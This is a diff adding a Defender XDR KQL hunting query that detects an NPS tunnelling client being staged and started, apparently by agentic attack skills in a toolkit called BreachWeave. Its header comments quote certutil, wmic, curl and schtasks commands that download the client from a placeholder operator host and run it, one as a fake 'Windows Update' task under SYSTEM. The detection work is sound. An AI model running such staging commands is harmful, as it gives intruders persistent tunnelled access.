@@ -1,0 +1,29 @@
+// NPS client staged on a host the way BreachWeave's skills tell the solver to
+// Agentic attack detections by ThreatDefence (BreachWeave). Source: https://github.com/ThreatDefence/agentic-attack-detections
+// ATT&CK: T1105 (Ingress Tool Transfer), T1572 (Protocol Tunneling), T1047 (Windows Management Instrumentation), T1053.005 (Scheduled Task/Job: Scheduled Task)
+// Example hunt for Defender XDR advanced hunting. Test and baseline before alerting.
+// The redis-webroot-rce, intranet-pentest, known-product-exploit and remote-cmd-execution skills (m-sec-org/BreachWeave
+// at bc2d9502) take over a host by fetching the NPS client from the operator's bridge and starting it in the background:
+//  - certutil.exe -urlcache -split -f http://<bridge>:44944/files/nps/npc_windows_amd64.exe C:\Users\Public\npc.exe
+//  - wmic.exe process call create "C:\Users\Public\npc.exe -server=<bridge>:44944 -vkey=auto"
+//  - curl -o /tmp/npc http://<bridge>:44944/files/nps/npc_linux_amd64; setsid /tmp/npc -server=<bridge>:8024 -vkey=auto
+//  - schtasks /create ... /tn "Windows Update" /tr "C:\temp\npc.exe -server=<NPS_IP>:8024 -vkey=auto" /ru SYSTEM
+// The second half lists outbound connections from the staged npc process.
+
+let Window = 30d;
+let Staging = DeviceProcessEvents
+    | where Timestamp > ago(Window)
+    | where ProcessCommandLine has "/files/nps/npc_"
+        or (ProcessCommandLine has "-vkey=auto" and ProcessCommandLine has "-server=")
+    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName;
+union isfuzzy=true
+    (Staging
+        | summarize Commands=make_set(substring(ProcessCommandLine, 0, 300), 10), Parents=make_set(InitiatingProcessFileName, 5),
+            Timestamp=min(Timestamp) by DeviceName, AccountName
+        | project Timestamp, DeviceName, Signal="NPS client fetched or started with -vkey=auto", Detail=strcat(tostring(Parents), " ", tostring(Commands))),
+    (DeviceNetworkEvents
+        | where Timestamp > ago(Window)
+        | where InitiatingProcessCommandLine has "-vkey=auto" and InitiatingProcessCommandLine has "-server="
+        | summarize Remotes=make_set(strcat(RemoteIP, ":", RemotePort), 10), Timestamp=min(Timestamp) by DeviceName, InitiatingProcessFileName
+        | project Timestamp, DeviceName, Signal="Connections from the staged NPS client", Detail=strcat(InitiatingProcessFileName, " ", tostring(Remotes)))
+| order by Timestamp desc
